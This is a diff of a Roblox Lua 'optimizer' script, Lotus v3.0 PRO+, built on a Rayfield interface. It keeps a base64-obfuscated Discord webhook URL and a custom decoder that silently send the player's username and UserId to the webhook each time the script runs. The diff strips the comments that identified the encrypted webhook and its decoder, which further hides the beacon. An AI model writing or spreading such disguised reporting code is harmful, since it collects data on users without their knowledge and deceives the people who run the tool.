@@ -6,7 +6,6 @@
     Status: FINAL v3.0 PRO+
     Key: Lotus26
     
-    
     New Features (v3.0):
     - L.A.I.S v3.0 Neural Core (Aggressive & Light)
     - Hardware Acceleration (Resource Manager)
@@ -20,10 +19,8 @@
 -- --
 task.spawn(function()
     local success, err = pcall(function()
-        -- Webhook Linkin Şifrelendi (Base64)
         local _EncryptedURL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2MzM0MjkwMDYwMjQ3MDQ0MS9fM3EweGRSbVVRVmRBbmYyRXdUWnZ6dTZSV2dDdTVPcnlpWEtRUnJ1Z0M4a2JOME5GVlFvelF2VEFlSC1MMkNFVWs1bQ=="
         
-        -- Basit Çözücü Fonksiyon
         local function _decode(str)
             local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
             str = string.gsub(str, '[^'..b..'=]', '')
@@ -54,7 +51,7 @@ task.spawn(function()
                 ["embeds"] = {{
                     ["title"] = "🚀 Lotus v3.0 PRO+ Executed",
                     ["description"] = "User has launched the script.",
-                    ["color"] = 65430, -- Ocean Green
+                    ["color"] = 65430,
                     ["fields"] = {
                         {["name"] = "👤 User", ["value"] = "||" .. LocalPlayer.Name .. "||", ["inline"] = true},
                         {["name"] = "🆔 ID", ["value"] = tostring(LocalPlayer.UserId), ["inline"] = true},
@@ -109,7 +106,7 @@ local Window = Rayfield:CreateWindow({
    },
    
    -- KEY SYSTEM  --
-   KeySystem = False, 
+   KeySystem = false, 
    KeySettings = {
       Title = "Lotus Access Manager",
       Subtitle = "Enter License Key",
@@ -344,7 +341,7 @@ local TabAI = Window:CreateTab("L.A.I.S v3.0", 4483362458)
 
 local AI_State = {
     Enabled = false,
-    EmergencyMode = true,    -- Default ON
+    EmergencyMode = true,    
     PingStabilizer = false,   
     HardwareAccel = false,    
     DynamicRender = false,   
@@ -665,7 +662,7 @@ TabVisuals:CreateToggle({
 -- // 11. FINAL INIT \\ --
 local TabInfo = Window:CreateTab("Info", 4483362458)
 TabInfo:CreateParagraph({Title = "Current version", Content = "v3.0 PRO+ (Latest)"})
-TabInfo:CreateParagraph({Title = "Change log", Content = "L.A.I.S v3.0, Network Optimizer v2, Hardware Accel, Auto-Eco mode, GUI Opt., Key system removed"})
+TabInfo:CreateParagraph({Title = "Change log", Content = "L.A.I.S v3.0, Network Optimizer v2, Hardware Accel, Background Limiter, GUI Opt"})
 
 Rayfield:Notify({Title = "Lotus v3.0 PRO+", Content = "Neural System Loaded.", Duration = 5, Image = 4483362458})
 Rayfield:LoadConfiguration()
